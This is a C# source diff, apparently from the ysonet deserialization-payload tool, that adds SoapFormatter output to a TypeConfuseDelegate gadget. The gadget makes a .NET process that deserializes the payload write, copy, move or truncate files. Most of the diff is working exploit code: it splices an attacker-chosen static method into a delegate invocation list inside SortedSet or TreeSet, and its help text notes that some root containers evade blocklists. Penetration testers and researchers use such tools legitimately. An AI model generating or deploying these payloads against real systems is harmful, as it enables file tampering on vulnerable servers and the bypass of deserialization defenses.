@@ -2,6 +2,11 @@ using NDesk.Options;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Reflection;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Soap;
+using System.Text;
+using System.Xml;
 using ysonet.Helpers;
 
 namespace ysonet.Generators
@@ -43,14 +48,26 @@ namespace ysonet.Generators
      * its own handle.
      *
      * --rootcontainer is orthogonal to the operation and picks the serialized ROOT the
-     * splice travels in (1 SortedSet, 2 SortedDictionary, 3 TreeSet), exactly as it does on
-     * the two HostedPayloads gadgets.
+     * splice travels in (1 SortedSet, 2 SortedDictionary, 3 TreeSet). SoapFormatter uses a
+     * direct CLR4 document for roots 1 and 3; root 2 is a deeper generic graph and is
+     * explicitly refused for SOAP.
      *
      * Like every payload built on this primitive it needs .NET Framework 4.5+, because
      * Comparer<T>.Create and the ComparisonComparer<T> it returns do not exist in 4.0.
      */
     public class TypeConfuseDelegateFileOperationsGenerator : GenericGenerator
     {
+        public override bool SupportsLegacyFx()
+        {
+            return false;
+        }
+
+        private const string RootContainerOptionName = "rootcontainer";
+        private const string SoapSetAliasNamespace = "YsonetTcdFileOpsSoapSetProxy";
+        private const string SoapSetAliasType = "YsonetTcdFileOpsSetRootAlias";
+        private const string SoapComparerAliasNamespace = "YsonetTcdFileOpsSoapComparerProxy";
+        private const string SoapComparerAliasType = "YsonetTcdFileOpsComparerAlias";
+
         // ---- Operation table ---------------------------------------------------
         //
         // One row per variant, so the label, the -c meaning, the error wording and the
@@ -161,7 +178,8 @@ namespace ysonet.Generators
                 + "delegate confusion, without starting a process: write text from a local "
                 + "file, copy, move, move a directory, or create/truncate an empty file. The "
                 + "var/variant option picks the operation and decides what -c means; the two "
-                + "strings must be in strict ordinal order, which the generator enforces.";
+                + "strings must be in strict ordinal order, which the generator enforces. "
+                + "This CLR4.5+ graph does not support --legacyfx.";
         }
 
         public override List<string> Labels()
@@ -229,10 +247,11 @@ namespace ysonet.Generators
                         + "not overwrite an existing destination; dirmove needs an existing "
                         + "source, a free destination and the same volume; all of them need the "
                         + "target process to have the file-system rights. --minify with "
-                        + "NetDataContractSerializer is refused when it would rewrite either "
-                        + "string (the XML minifier trims trailing whitespace, drops a carriage "
-                        + "return, and collapses \"; \"); BinaryFormatter and LosFormatter minify "
-                        + "the same input safely.",
+                        + "NetDataContractSerializer or SoapFormatter is refused when it would "
+                        + "rewrite either string (the XML minifier trims trailing whitespace, "
+                        + "drops a carriage return, and collapses \"; \"); SOAP is also refused "
+                        + "without --minify if its XML writer loses a value. BinaryFormatter and "
+                        + "LosFormatter minify the same input safely.",
                     v =>
                     {
                         int parsed;
@@ -246,29 +265,45 @@ namespace ysonet.Generators
                     }
                 },
                 {
-                    TypeConfuseDelegateGenerator.RootContainerOptionName + "=",
-                    TypeConfuseDelegateGenerator.RootContainerOptionHelp
-                        + " It does not change the file operation.",
-                    v => root_container_number =
-                        TypeConfuseDelegateGenerator.ParseRootContainerOption(v)
+                    RootContainerOptionName + "=",
+                    "Serialized root container, independent of the five file-operation "
+                        + "variants: 1 -> SortedSet [default], 2 -> SortedDictionary, 3 -> "
+                        + "TreeSet. BinaryFormatter, NetDataContractSerializer and "
+                        + "LosFormatter support all three roots. SoapFormatter supports all "
+                        + "five file operations with roots 1 and 3, but not root 2. The (5) "
+                        + "formatter annotation counts file-operation variants, not root "
+                        + "choices. Roots 2 and 3 evade a binder or blocklist that rejects "
+                        + "the exact SortedSet wire type name. Changing this option does not "
+                        + "change the selected file operation.",
+                    v => root_container_number = ParseRootContainer(v)
                 },
             };
+        }
+
+        private static int ParseRootContainer(string value)
+        {
+            int parsed;
+            if (!int.TryParse(value, out parsed) || parsed < 1 || parsed > 3)
+                throw new OptionException(RootContainerOptionName
+                    + " must be 1, 2, or 3", RootContainerOptionName);
+            return parsed;
         }
 
         // The same three formatters TypeConfuseDelegate advertises, and for the same
         // reasons. The spliced method travels in a DelegateSerializationHolder record,
         // which only the runtime formatters and NetDataContractSerializer reproduce, so no
         // public-member serializer (Json.NET, XmlSerializer, DataContractSerializer, ...)
-        // can rebuild a MulticastDelegate invocation list. SoapFormatter is absent for a
-        // second, independent reason: every root container is a generic type
-        // (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter cannot serialize
-        // one. The "(5)" annotation is display-only and means all five variants ride that
-        // formatter.
+        // can rebuild a MulticastDelegate invocation list. SOAP is authored through
+        // non-generic generation-only aliases and exposes the native CLR4 SortedSet or
+        // TreeSet plus ComparisonComparer to the target; rootcontainer 2 remains an
+        // explicit unsupported option cell. The "(5)" annotation is display-only and means
+        // all five operation variants ride that formatter.
         public override List<string> SupportedFormatters()
         {
             return new List<string>
             {
-                "BinaryFormatter (5)", "NetDataContractSerializer (5)", "LosFormatter (5)"
+                "BinaryFormatter (5)", "NetDataContractSerializer (5)",
+                "SoapFormatter (5)", "LosFormatter (5)"
             };
         }
 
@@ -286,17 +321,319 @@ namespace ysonet.Generators
             ReadFields(op, inputArgs, out first, out second);
             RequireOrdinalOrder(op, first, second);
 
+            if (formatter.Equals(Formatters.SoapFormatter,
+                StringComparison.OrdinalIgnoreCase))
+            {
+                if (root_container_number == 2)
+                    throw new ArgumentException("SoapFormatter supports " + Name()
+                        + " with rootcontainer 1 (SortedSet) and 3 (TreeSet), not 2 "
+                        + "(SortedDictionary).");
+                return SerializeSoapFileContainer(root_container_number, op,
+                    first, second, inputArgs);
+            }
+
             // keysMayCollide is false: RequireOrdinalOrder has already refused an equal
             // pair with a message that names the operation, so the generic duplicate-key
-            // refusal inside the shared builder can never be reached from here.
-            object payload = TypeConfuseDelegateGenerator.BuildConfusedContainer(
-                root_container_number, TypeConfuseDelegateGenerator.OrdinalCompare,
-                Slot1For(op.Number), first, second, false);
+            // refusal inside the container can never be reached from here.
+            object payload = BuildConfusedContainer(root_container_number,
+                Slot1For(op.Number), first, second);
 
             if (inputArgs != null && inputArgs.Minify)
                 RequireStringsSurviveMinification(payload, formatter, inputArgs, op, first, second);
 
             return Serialize(payload, formatter, inputArgs);
+        }
+
+        // ---- Complete object graph --------------------------------------------
+
+        // Kept in this generator rather than delegated to TypeConfuseDelegateGenerator:
+        // this is an independent gadget, so Generators/README.md requires every target
+        // type, member order and splice that changes its payload to live in this file.
+        private static object BuildConfusedContainer(int container, Delegate slot1,
+            string first, string second)
+        {
+            Comparison<string> combined = (Comparison<string>)MulticastDelegate.Combine(
+                new Comparison<string>(String.CompareOrdinal),
+                new Comparison<string>(String.CompareOrdinal));
+            IComparer<string> comparer = Comparer<string>.Create(combined);
+
+            object root;
+            if (container == 2)
+            {
+                SortedDictionary<string, string> dictionary =
+                    new SortedDictionary<string, string>(comparer);
+                dictionary.Add(first, "");
+                dictionary.Add(second, "");
+                root = dictionary;
+            }
+            else if (container == 3)
+            {
+                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
+                    "System.Collections.Generic.TreeSet`1", false);
+                if (openTreeSet == null)
+                    throw new PlatformNotSupportedException(
+                        "TreeSet is unavailable; this container requires .NET Framework 4.5+.");
+                root = Activator.CreateInstance(openTreeSet.MakeGenericType(typeof(string)),
+                    new object[] { comparer });
+                ICollection<string> items = (ICollection<string>)root;
+                items.Add(first);
+                items.Add(second);
+            }
+            else if (container == 1)
+            {
+                SortedSet<string> set = new SortedSet<string>(comparer);
+                set.Add(first);
+                set.Add(second);
+                root = set;
+            }
+            else
+            {
+                throw new ArgumentException("Unknown rootcontainer " + container
+                    + " (use 1, 2, or 3).");
+            }
+
+            FieldInfo invocationList = typeof(MulticastDelegate).GetField(
+                "_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+            if (invocationList == null)
+                throw new MissingFieldException(typeof(MulticastDelegate).FullName,
+                    "_invocationList");
+            object[] slots = combined.GetInvocationList();
+            slots[1] = slot1;
+            invocationList.SetValue(combined, slots);
+            return root;
+        }
+
+        // ---- Direct SoapFormatter document ------------------------------------
+
+        private object SerializeSoapFileContainer(int container, FileOperation op,
+            string first, string second, InputArgs inputArgs)
+        {
+            string payload = BuildSoapFileDocument(container, op, first, second,
+                inputArgs != null && inputArgs.Minify);
+            RequireSoapStringsSurvive(payload, container, op, first, second, inputArgs);
+            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
+                inputArgs, null, true);
+        }
+
+        private string BuildSoapFileDocument(int container, FileOperation op,
+            string first, string second, bool minify)
+        {
+            var comparer = new SoapComparisonComparerProxy(Slot1For(op.Number));
+            string[] items = new string[] { second, first }; // strict ordinal order proved above
+            var root = new SoapSetProxy(comparer, items);
+
+            string payload;
+            using (MemoryStream stream = new MemoryStream())
+            {
+                new SoapFormatter().Serialize(stream, root);
+                payload = Encoding.UTF8.GetString(stream.ToArray());
+            }
+
+            XmlDocument document = new XmlDocument();
+            document.PreserveWhitespace = true;
+            document.LoadXml(payload);
+
+            Type comparisonComparer = RequireSoapType(typeof(Comparer<>).Assembly,
+                "System.Collections.Generic.ComparisonComparer`1").MakeGenericType(
+                    typeof(string));
+            Type rootType = container == 3
+                ? RequireSoapType(typeof(SortedSet<>).Assembly,
+                    "System.Collections.Generic.TreeSet`1").MakeGenericType(typeof(string))
+                : typeof(SortedSet<string>);
+
+            RewriteSoapTypeAlias(document, SoapSetAliasNamespace, SoapSetAliasType,
+                rootType.FullName, rootType.Assembly.FullName);
+            RewriteSoapTypeAlias(document, SoapComparerAliasNamespace, SoapComparerAliasType,
+                comparisonComparer.FullName, comparisonComparer.Assembly.FullName);
+            payload = document.OuterXml;
+
+            if (minify)
+                payload = XmlMinifier.Minify(payload, null, null,
+                    FormatterType.SoapFormatter, true);
+            return payload;
+        }
+
+        private void RequireSoapStringsSurvive(string payload, int container,
+            FileOperation op, string first, string second, InputArgs inputArgs)
+        {
+            var wanted = new List<string> { first, second };
+            List<string> missing = MinifiedTextGuard.MissingTextValues(payload, wanted);
+            if (missing.Count == 0)
+                return;
+
+            bool minified = inputArgs != null && inputArgs.Minify;
+            bool rawWouldWork = false;
+            if (minified)
+            {
+                string raw = BuildSoapFileDocument(container, op, first, second, false);
+                rawWouldWork = MinifiedTextGuard.MissingTextValues(raw, wanted).Count == 0;
+            }
+
+            string fieldName = string.Equals(missing[0], first, StringComparison.Ordinal)
+                ? op.FirstField : op.SecondField;
+            if (rawWouldWork)
+                throw new ArgumentException(op.Name + " cannot use --minify with "
+                    + Formatters.SoapFormatter + " for this input: the XML minifier rewrites "
+                    + "the " + fieldName + ". Drop --minify, or use BinaryFormatter or "
+                    + "LosFormatter, whose streams carry the string unchanged.");
+
+            throw new ArgumentException(op.Name + " cannot carry this input with "
+                + Formatters.SoapFormatter + ": SOAP XML rewrites the " + fieldName
+                + (minified ? " even without --minify" : "")
+                + ". Use BinaryFormatter or LosFormatter, whose streams carry the string "
+                + "unchanged.");
+        }
+
+        private static Type RequireSoapType(Assembly assembly, string fullName)
+        {
+            Type type = assembly.GetType(fullName, false);
+            if (type == null)
+                throw new SerializationException("Required SOAP target type is unavailable: "
+                    + fullName + " in " + assembly.FullName);
+            return type;
+        }
+
+        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
+            string aliasType)
+        {
+            info.FullTypeName = aliasNamespace + "." + aliasType;
+            info.AssemblyName = aliasNamespace;
+        }
+
+        [Serializable]
+        private sealed class SoapComparisonComparerProxy : IComparer<string>, ISerializable
+        {
+            private readonly SoapDelegateProxy comparison;
+
+            internal SoapComparisonComparerProxy(Delegate slot1)
+            {
+                comparison = new SoapDelegateProxy(slot1);
+            }
+
+            private SoapComparisonComparerProxy(SerializationInfo info,
+                StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP comparer proxy is never deserialized.");
+            }
+
+            public int Compare(string left, string right)
+            {
+                return String.CompareOrdinal(left, right);
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                SetSoapAlias(info, SoapComparerAliasNamespace, SoapComparerAliasType);
+                info.AddValue("_comparison", comparison, typeof(object));
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapDelegateEntryProxy : ISerializable
+        {
+            private readonly string delegateType;
+            private readonly string delegateAssembly;
+            private readonly string targetAssembly;
+            private readonly string targetType;
+            private readonly string method;
+            private readonly SoapDelegateEntryProxy next;
+
+            internal SoapDelegateEntryProxy(Delegate value, SoapDelegateEntryProxy next)
+            {
+                MethodInfo targetMethod = value.Method;
+                delegateType = value.GetType().FullName;
+                delegateAssembly = value.GetType().Assembly.FullName;
+                targetAssembly = targetMethod.DeclaringType.Assembly.FullName;
+                targetType = targetMethod.DeclaringType.FullName;
+                method = targetMethod.Name;
+                this.next = next;
+            }
+
+            private SoapDelegateEntryProxy(SerializationInfo info,
+                StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP delegate-entry proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(RequireSoapType(typeof(object).Assembly,
+                    "System.DelegateSerializationHolder+DelegateEntry"));
+                info.AddValue("type", delegateType);
+                info.AddValue("assembly", delegateAssembly);
+                info.AddValue("target", null);
+                info.AddValue("targetTypeAssembly", targetAssembly);
+                info.AddValue("targetTypeName", targetType);
+                info.AddValue("methodName", method);
+                info.AddValue("delegateEntry", next);
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapDelegateProxy : ISerializable
+        {
+            private readonly SoapDelegateEntryProxy entry;
+            private readonly MethodInfo attackerMethod;
+            private readonly MethodInfo benignMethod;
+
+            internal SoapDelegateProxy(Delegate slot1)
+            {
+                Comparison<string> benign =
+                    new Comparison<string>(String.CompareOrdinal);
+                if (slot1 == null || slot1.Target != null)
+                    throw new ArgumentException("The direct file-operation SOAP form "
+                        + "requires a static method in invocation-list slot 1.");
+                benignMethod = benign.Method;
+                attackerMethod = slot1.Method;
+                SoapDelegateEntryProxy benignEntry =
+                    new SoapDelegateEntryProxy(benign, null);
+                entry = new SoapDelegateEntryProxy(slot1, benignEntry);
+            }
+
+            private SoapDelegateProxy(SerializationInfo info, StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP delegate proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(RequireSoapType(typeof(object).Assembly,
+                    "System.DelegateSerializationHolder"));
+                info.AddValue("Delegate", entry);
+                info.AddValue("method0", attackerMethod);
+                info.AddValue("method1", benignMethod);
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapSetProxy : ISerializable
+        {
+            private readonly SoapComparisonComparerProxy comparer;
+            private readonly string[] items;
+
+            internal SoapSetProxy(SoapComparisonComparerProxy comparer, string[] items)
+            {
+                this.comparer = comparer;
+                this.items = items;
+            }
+
+            private SoapSetProxy(SerializationInfo info, StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP set proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
+                info.AddValue("Count", items.Length);
+                info.AddValue("Comparer", comparer, typeof(object));
+                info.AddValue("Version", items.Length);
+                info.AddValue("Items", items, typeof(string[]));
+            }
         }
 
         // ---- Minification safety ------------------------------------------------
